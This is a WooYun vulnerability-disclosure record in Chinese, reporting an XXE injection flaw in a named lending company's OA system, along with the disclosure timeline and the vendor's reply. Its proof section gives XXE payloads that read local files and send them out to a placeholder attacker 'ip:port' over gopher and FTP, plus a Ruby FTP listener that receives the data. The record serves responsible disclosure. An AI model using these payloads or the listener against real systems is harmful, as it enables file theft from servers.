{"id": 85715, "wybug_id": "wooyun-2016-0173700", "wybug_title": "p2p金融安全之微贷网某系统存在XML实体注入漏洞", "wybug_corp": "weidai.com.cn", "wybug_author": "路人甲", "wybug_date": "2016-01-29 17:58", "wybug_open_date": "2016-03-14 15:10", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2016-01-29：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2016-02-01：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2016-02-11：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2016-02-21：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2016-03-02：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2016-03-14：\t细节向公众公开  简要描述： RT，看到这个系统好熟悉，恰好看到了tangscan有这个系统的，购买并下载的tangscan的插件直接命中。23333 详细说明：  地址https://oa.weidai.com.cn，两个端口的地方\n\n\n\n   漏洞证明：  打算使用\n<!ENTITY % a SYSTEM \"file:///c:/\"><!ENTITY % b \"<!ENTITY &#37; c SYSTEM 'gopher://ip:port/?%a;'>\">%b;%c;\n来获取回显的结果，发现gopher的时候没回显，估计是版本较高，于是采取ftp协议来回显内容\n<!ENTITY % a SYSTEM \"file:///c:/><!ENTITY % b \"<!ENTITY &#37; c SYSTEM 'ftp://ip:port/%a;'>\">%b;%c;\n利用BURP加载重新发包，看到数据回馈\n\n[我的服务器没有成功，让基佬帮忙立马回显。估计这个跟颜值成正比].附上ftp回显的code\nrequire 'socket'server = TCPServer.new 58000loop do  Thread.start(server.accept) do |client|    puts \"New client connected\"    data = \"\"    client.puts(\"220 xxe-ftp-server\")    loop {        req = client.gets()        puts \"< \"+req        if req.include? \"USER\"            client.puts(\"331 password please - version check\")        else            puts \"> 230 more data please!\"            client.puts(\"230 more data please!\")        end    }  endend\n   修复方案：     版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：低 漏洞Rank：5  确认时间：2016-02-01 10:50 厂商回复： 供应商的oa漏洞，谢谢提出，我们马上处理 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n     2016-02-01 10:50 |    \t\t微贷网(乌云厂商)\t\t \n  供应商的oa漏洞，谢谢提出，我们马上处理    \n  \n\n\n", "wybug_level_fromcorp": "低", "wybug_rank_fromcorp": 5, "Ranks": null}